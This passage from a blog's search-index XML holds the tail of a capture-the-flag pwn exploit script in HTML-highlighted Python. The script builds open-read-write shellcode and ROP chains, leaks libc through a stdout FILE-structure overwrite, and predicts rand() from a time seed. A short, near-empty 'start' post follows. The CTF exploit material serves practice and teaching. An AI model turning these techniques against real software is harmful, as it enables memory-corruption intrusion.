p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>)<br>    orw+= p64(write_addr)<br>    <span class="hljs-keyword">return</span> orw<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getorw</span>(<span class="hljs-params">name,buf,Arch</span>) :<br>    sh=shellcraft.<span class="hljs-built_in">open</span>(name)<br>    sh+=shellcraft.read(<span class="hljs-number">3</span>,buf,<span class="hljs-number">0x30</span>)<br>    sh+=shellcraft.write(<span class="hljs-number">1</span>,buf,<span class="hljs-number">0x30</span>)<br>    sh=asm(sh,arch=Arch)<br>    <span class="hljs-keyword">return</span> sh<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gdbp</span>(<span class="hljs-params">p,a=<span class="hljs-string">&#x27;&#x27;</span></span>) :<br>    <span class="hljs-keyword">if</span> a!=<span class="hljs-string">&#x27;&#x27;</span>:<br>        gdb.attach(p,a)<br>        pause()<br>    <span class="hljs-keyword">else</span> :<br>        gdb.attach(p)<br>        pause()<br><br><span class="hljs-comment">#p = remote(&#123;IP&#125;)</span><br>p = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-comment">#elf = ELF(&quot;./pwn&quot;)</span><br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>lib = cdll.LoadLibrary(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><br><span class="hljs-comment">#p = process([&quot;qemu-mipsel-static&quot;,&quot;-g&quot;, &quot;9999&quot;,&quot;-L&quot;,&quot;./&quot;,&quot;./pwn&quot;])</span><br><span class="hljs-comment">#p = process([&quot;qemu-mipsel-static&quot;,&quot;-L&quot;,&quot;./&quot;,&quot;./pwn&quot;])</span><br><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><span class="hljs-comment">#context.arch = &#x27;amd64&#x27;</span><br><span class="hljs-comment">#context.os = &#x27;linux&#x27;</span><br><span class="hljs-comment">#elf.arch , elf.so</span><br><br>i = <span class="hljs-built_in">int</span>(time.time())<br>lib.srand(i)<br><br>sela(<span class="hljs-string">b&quot;answer?\n&quot;</span>,stre(-<span class="hljs-number">8</span>))<br>payload = p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + <span class="hljs-string">b&quot;\x00&quot;</span><br>sela(<span class="hljs-string">b&quot;answer.\n&quot;</span>,payload)<br>re(<span class="hljs-number">0x8</span>)<br>libc_base = raddr64() - <span class="hljs-number">0x1ec980</span><br>ph(libc_base,<span class="hljs-string">&quot;libc_base&quot;</span>)<br>puts_addr = libc_base + libc.sym[<span class="hljs-string">&quot;puts&quot;</span>]<br><br>payload = p64(puts_addr+(lib.rand()%<span class="hljs-number">0x2333</span>))<br>sela(<span class="hljs-string">b&quot;answer?&quot;</span>,stre(<span class="hljs-number">3</span>))<br>sela(<span class="hljs-string">b&quot;answer.&quot;</span>,payload)<br><br>sela(<span class="hljs-string">b&quot;answer?&quot;</span>,stre(<span class="hljs-number">1</span>))<br>sela(<span class="hljs-string">b&quot;answer.&quot;</span>,<span class="hljs-string">b&quot;A&quot;</span>)<br><br>op()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>start</title>
    <link href="/2024/07/18/start/"/>
    <url>/2024/07/18/start/</url>
    
    <content type="html"><![CDATA[<h3><center>Let's Start</center></h3><p><img src="/2024/07/18/start/start.jpg"></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
